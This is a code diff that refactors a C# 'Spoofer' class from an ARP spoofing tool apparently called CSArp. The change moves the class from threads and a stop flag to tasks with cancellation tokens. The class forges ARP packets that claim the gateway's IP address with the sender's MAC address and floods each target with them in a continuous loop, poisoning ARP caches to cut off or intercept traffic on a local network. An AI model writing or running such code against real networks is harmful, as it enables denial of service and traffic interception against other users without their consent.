@@ -2,9 +2,8 @@
 using System.Net;
 using System.Net.NetworkInformation;
 using System.Threading;
-using CSArp.Model.Extensions;
+using System.Threading.Tasks;
 using CSArp.Model.Utilities;
-using CSArp.View;
 using PacketDotNet;
 using SharpPcap;
 using SharpPcap.LibPcap;
@@ -13,57 +12,63 @@ namespace CSArp.Model
 {
     public class Spoofer
     {
-        public LibPcapLiveDevice NetworkAdapter { get; set; }
+        private readonly List<Task> _spoofingTasks = new List<Task>();
+        private CancellationTokenSource _spoofingCts;
 
-        private Dictionary<IPAddress, PhysicalAddress> engagedclientlist;
-        private volatile bool disengageflag = true;
-
-        public void Start(Dictionary<IPAddress, PhysicalAddress> targetlist, IPAddress gatewayipaddress, PhysicalAddress gatewaymacaddress, LibPcapLiveDevice networkAdapter)
+        public void Start(
+            Dictionary<IPAddress, PhysicalAddress> targetList,
+            IPAddress gatewayIpAddress,
+            PhysicalAddress gatewayMacAddress,
+            LibPcapLiveDevice networkAdapter)
         {
-            engagedclientlist = new Dictionary<IPAddress, PhysicalAddress>();
-            disengageflag = false;
+            StopAll();
+            _spoofingCts = new CancellationTokenSource();
+
             if (!networkAdapter.Opened)
             {
                 networkAdapter.Open();
             }
 
-            foreach (var target in targetlist)
+            foreach (var target in targetList)
             {
-                var myipaddress = networkAdapter.ReadCurrentIpV4Address();
-                var arppacketforgatewayrequest = new ArpPacket(ArpOperation.Request, "00-00-00-00-00-00".Parse(), gatewayipaddress, networkAdapter.MacAddress, target.Key);
-                var ethernetpacketforgatewayrequest = new EthernetPacket(networkAdapter.MacAddress, gatewaymacaddress, EthernetType.Arp)
+                var arpPacketForGatewayRequest = new ArpPacket(ArpOperation.Request, "00-00-00-00-00-00".Parse(), gatewayIpAddress, networkAdapter.MacAddress, target.Key);
+                var ethernetPacketForGatewayRequest = new EthernetPacket(networkAdapter.MacAddress, gatewayMacAddress, EthernetType.Arp)
                 {
-                    PayloadPacket = arppacketforgatewayrequest
+                    PayloadPacket = arpPacketForGatewayRequest
                 };
-                ThreadBuffer.Add(new Thread(() =>
-                    SendSpoofingPacket(target.Key, target.Value, ethernetpacketforgatewayrequest, networkAdapter)
-                  ));
-                engagedclientlist.Add(target.Key, target.Value);
+
+                _spoofingTasks.Add(Task.Run(() => SendSpoofingPacket(target.Key, target.Value, ethernetPacketForGatewayRequest, networkAdapter, _spoofingCts.Token), _spoofingCts.Token));
             }
-            ;
         }
 
         public void StopAll()
         {
-            disengageflag = true;
-            engagedclientlist?.Clear();
+            _spoofingCts?.Cancel();
+            _spoofingTasks.Clear();
         }
 
-        private void SendSpoofingPacket(IPAddress ipAddress, PhysicalAddress physicalAddress, EthernetPacket ethernetpacketforgatewayrequest, LibPcapLiveDevice captureDevice)
+        private static void SendSpoofingPacket(
+            IPAddress ipAddress,
+            PhysicalAddress physicalAddress,
+            EthernetPacket ethernetPacket,
+            LibPcapLiveDevice captureDevice,
+            CancellationToken cancellationToken)
         {
-            DebugOutput.Print("Spoofing target " + physicalAddress.ToString() + " @ " + ipAddress.ToString());
+            DebugOutput.Print("Spoofing target " + physicalAddress + " @ " + ipAddress);
+
             try
             {
-                while (!disengageflag)
+                while (!cancellationToken.IsCancellationRequested)
                 {
-                    captureDevice.SendPacket(ethernetpacketforgatewayrequest);
+                    captureDevice.SendPacket(ethernetPacket);
                 }
             }
             catch (PcapException ex)
             {
-                DebugOutput.Print("PcapException @ DisconnectReconnect.Disconnect() [" + ex.Message + "]");
+                DebugOutput.Print("PcapException @ Spoofer.SendSpoofingPacket() [" + ex.Message + "]");
             }
-            DebugOutput.Print("Spoofing thread @ DisconnectReconnect.Disconnect() for " + physicalAddress.ToString() + " @ " + ipAddress.ToString() + " is terminating.");
+
+            DebugOutput.Print("Spoofing thread terminating for " + physicalAddress + " @ " + ipAddress);
         }
     }
 }
